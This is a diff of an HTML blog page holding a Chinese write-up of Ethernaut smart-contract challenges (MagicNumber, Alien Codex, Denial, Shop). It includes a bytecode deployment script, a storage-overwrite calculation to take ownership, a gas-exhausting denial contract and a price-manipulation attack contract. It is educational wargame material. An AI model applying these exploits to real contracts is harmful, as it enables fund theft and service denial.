@@ -143,44 +143,28 @@
           
           
 
-          
-
-<h2 id="前言">前言</h2>
-
+          <h2 id="前言">前言</h2>
 <p>久违地想做智能合约的题目了，正好 Ethernaut 上还有几题没做的，就特地在博客里码一下~~</p>
-
 <h2 id="magicnumber">MagicNumber</h2>
-
-<p>手动构造智能合约，具体参考了 <a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2" rel="nofollow noreferrer" target="_blank">Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes</a></p>
-
+<p>手动构造智能合约，具体参考了 <a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes</a></p>
 <p>这里需要明确的知识点如下：</p>
-
 <h3 id="合约-bytcode">合约 bytcode</h3>
-
 <p>简单说，合约 bytecode 可以分为如下三个部分：部署代码、合约代码、以及用于验证的 Auxdata，在合约创建时运行的是部署代码，在合约创建成功后，运行的是合约代码。</p>
-
 <pre><code>// 部署代码
 60606040523415600e57600080fd5b5b603680601c6000396000f300
 // 合约代码
 60606040525b600080fd00
 // Auxdata
 a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029
-</code></pre>
-
-<p>本题的限制是，合约代码长度不能超过 10，而且函数必须返回 42，这就需要我们手动构造合约 bytecode。</p>
-
+</code></pre><p>本题的限制是，合约代码长度不能超过 10，而且函数必须返回 42，这就需要我们手动构造合约 bytecode。</p>
 <p>合约代码部分构造如下：</p>
-
 <pre><code>602a    // v: push1 0x2a (value is 42)
 6080    // p: push1 0x80 (memory slot is 0x80)
 52      // mstore
 6020    // s: push1 0x20 (value is 32 bytes in size)
 6080    // p: push1 0x80 (value was stored in slot 0x80)
 f3      // return
-</code></pre>
-
-<p>部署代码构建如下：</p>
-
+</code></pre><p>部署代码构建如下：</p>
 <pre><code>600a    // s: push1 0x0a (10 bytes)
 600c    // f: push1 0x0c (current position of runtime opcodes)
 6000    // t: push1 0x00 (destination memory index 0)
@@ -188,92 +172,69 @@ f3      // return
 600a    // s: push1 0x0a (runtime opcode length)
 6000    // p: push1 0x00 (access memory index 0)
 f3      // return to EVM
-</code></pre>
+</code></pre><p>最终合约创建构造如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> web3 <span style="color:#f92672">import</span> Web3
 
-<p>最终合约创建构造如下：</p>
+my_ipc <span style="color:#f92672">=</span> Web3<span style="color:#f92672">.</span>HTTPProvider(<span style="color:#e6db74">&#34;https://ropsten.infura.io/v3/xxxxxxxxxxxxxxxxxxx&#34;</span>)
+<span style="color:#66d9ef">assert</span> my_ipc<span style="color:#f92672">.</span>isConnected()
+w3 <span style="color:#f92672">=</span> Web3(my_ipc)
 
-<pre><code class="language-python">from web3 import Web3
+myaddress <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+myprivkey <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
 
-my_ipc = Web3.HTTPProvider(&quot;https://ropsten.infura.io/v3/xxxxxxxxxxxxxxxxxxx&quot;)
-assert my_ipc.isConnected()
-w3 = Web3(my_ipc)
-
-myaddress = &quot;&quot;
-myprivkey = &quot;&quot;
-
-def makeTransaction(args):
-    obj = {
-        'gasPrice': Web3.toWei(1, 'gwei'),
-        'gas':300000,
-        'value': int(0)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">makeTransaction</span>(args):
+    obj <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;gasPrice&#39;</span>: Web3<span style="color:#f92672">.</span>toWei(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;gwei&#39;</span>),
+        <span style="color:#e6db74">&#39;gas&#39;</span>:<span style="color:#ae81ff">300000</span>,
+        <span style="color:#e6db74">&#39;value&#39;</span>: int(<span style="color:#ae81ff">0</span>)
     }
-    return {**obj, **args}
+    <span style="color:#66d9ef">return</span> {<span style="color:#f92672">**</span>obj, <span style="color:#f92672">**</span>args}
 
-def getNonce(address):
-    return w3.eth.getTransactionCount(Web3.toChecksumAddress(address))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getNonce</span>(address):
+    <span style="color:#66d9ef">return</span> w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>getTransactionCount(Web3<span style="color:#f92672">.</span>toChecksumAddress(address))
 
-def main():
-    txns = makeTransaction({'code': '0x600a600c600039600a6000f3602a60805260206080f3', 'nonce': getNonce(myaddress)})
-    signedTransaction = w3.eth.account.signTransaction(txns, myprivkey)
-    w3.eth.sendRawTransaction(signedTransaction.rawTransaction)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    txns <span style="color:#f92672">=</span> makeTransaction({<span style="color:#e6db74">&#39;code&#39;</span>: <span style="color:#e6db74">&#39;0x600a600c600039600a6000f3602a60805260206080f3&#39;</span>, <span style="color:#e6db74">&#39;nonce&#39;</span>: getNonce(myaddress)})
+    signedTransaction <span style="color:#f92672">=</span> w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>account<span style="color:#f92672">.</span>signTransaction(txns, myprivkey)
+    w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>sendRawTransaction(signedTransaction<span style="color:#f92672">.</span>rawTransaction)
 
-if __name__ == &quot;__main__&quot;:
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
     main()
-</code></pre>
-
-<h2 id="alien-codex">Alien Codex</h2>
-
+</code></pre></div><h2 id="alien-codex">Alien Codex</h2>
 <p>两个 trick，首先是 bypass 数组长度的限制：<code>assert(_firstContactMessage.length &gt; 2**200);</code>，其次是通过数组的越界写，对 owner 变量进行修改。</p>
-
-<p>通过阅读 <a href="https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html，可以发现参数的数组，其长度其实是在" rel="nofollow noreferrer" target="_blank">https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html，可以发现参数的数组，其长度其实是在</a> transaction 中的 data 决定的：</p>
-
+<p>通过阅读 <a href="https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html">https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html</a>，可以发现参数的数组，其长度其实是在 transaction 中的 data 决定的：</p>
 <pre><code>0x1d3d4c0b                                                       // function signature
 0000000000000000000000000000000000000000000000000000000000000020 // offset
 1000000000000000000000000000000000000000000000000000000000000001 // length
-</code></pre>
-
-<p>第二个考点是数组的越界写，类似 capturetheether 上的 mapping，我们需要控制向 codex 写的方式覆盖 owner 变量。首先第一步是调用 <code>retract()</code> 函数让数组长度下溢。第二步时计算 owner 变量在数组中的位置，具体计算规则为 <code>2**256 - sha3(bytes(1))</code>，得到 owner 对应 solt 0 的索引是 35707666377435648211887908874984608119992236509074197713628505308453184860938，调用 <code>revise</code> 即可得到结果。</p>
-
+</code></pre><p>第二个考点是数组的越界写，类似 capturetheether 上的 mapping，我们需要控制向 codex 写的方式覆盖 owner 变量。首先第一步是调用 <code>retract()</code> 函数让数组长度下溢。第二步时计算 owner 变量在数组中的位置，具体计算规则为 <code>2**256 - sha3(bytes(1))</code>，得到 owner 对应 solt 0 的索引是 35707666377435648211887908874984608119992236509074197713628505308453184860938，调用 <code>revise</code> 即可得到结果。</p>
 <h2 id="denail">Denail</h2>
-
 <p>题目的意思是禁止 owner 分走相应的余额，所以要求执行失败，本题的考点就是 Denail of Service.</p>
-
 <p>很明显可以利用 assert 会消耗所有 gas 的特性来达成该条件（当然也可以考虑重入攻击）。</p>
-
-<pre><code class="language-solidity">contract DenialAttack {   
-    function() payable {
-        assert(0 == 1);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> DenialAttack {   
+    <span style="color:#66d9ef">function</span>() <span style="color:#66d9ef">payable</span> {
+        assert(<span style="color:#ae81ff">0</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>);
     }
 }
-</code></pre>
-
-<h2 id="shop">Shop</h2>
-
+</code></pre></div><h2 id="shop">Shop</h2>
 <p>对 gas 的消耗有限制，所以不能通过 storage 变量的方式进行判断，但恰好 <code>isSold</code> 恰好可以代替用于判断的 storage 变量，所以构造 payload 如下：</p>
-
-<pre><code class="language-solidity">contract Attack is Buyer {
-    Shop public i;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">contract</span> Attack <span style="color:#66d9ef">is</span> Buyer {
+    Shop <span style="color:#66d9ef">public</span> i;
     
-    constructor(address _addr) public {
-        i = Shop(_addr);
+    constructor(<span style="color:#66d9ef">address</span> _addr) <span style="color:#66d9ef">public</span> {
+        i <span style="color:#f92672">=</span> Shop(_addr);
     }
     
-    function price() view returns(uint) {
-        return i.isSold() ? 0 : 100;
+    <span style="color:#66d9ef">function</span> price() <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span>(<span style="color:#66d9ef">uint</span>) {
+        <span style="color:#66d9ef">return</span> i.isSold() <span style="color:#f92672">?</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">100</span>;
     }
     
-    function hack() {
+    <span style="color:#66d9ef">function</span> hack() {
         i.buy();
     }
 }
-</code></pre>
-
-<h2 id="其他">其他</h2>
-
-<p>之前把前几题的解答投到先知上了 <a href="https://xz.aliyun.com/t/2856" rel="nofollow noreferrer" target="_blank">从 Ethernaut 看以太坊智能合约漏洞（一）</a>，剩下的可以参考 <a href="http://www.bendawang.site/2018/11/13/Zeppelin-ethernaut-writeup/" rel="nofollow noreferrer" target="_blank">Zeppelin ethernaut writeup</a> 或者 <a href="http://mitah.cn/index.php/archives/14/" rel="nofollow noreferrer" target="_blank">Zeppelin Ethernaut writeup</a></p>
-
+</code></pre></div><h2 id="其他">其他</h2>
+<p>之前把前几题的解答投到先知上了 <a href="https://xz.aliyun.com/t/2856">从 Ethernaut 看以太坊智能合约漏洞（一）</a>，剩下的可以参考 <a href="http://www.bendawang.site/2018/11/13/Zeppelin-ethernaut-writeup/">Zeppelin ethernaut writeup</a> 或者 <a href="http://mitah.cn/index.php/archives/14/">Zeppelin Ethernaut writeup</a></p>
 <h2 id="总结">总结</h2>
-
 <p>拖了半年才做完这些题目，好生颓废。</p>
 
     </div>
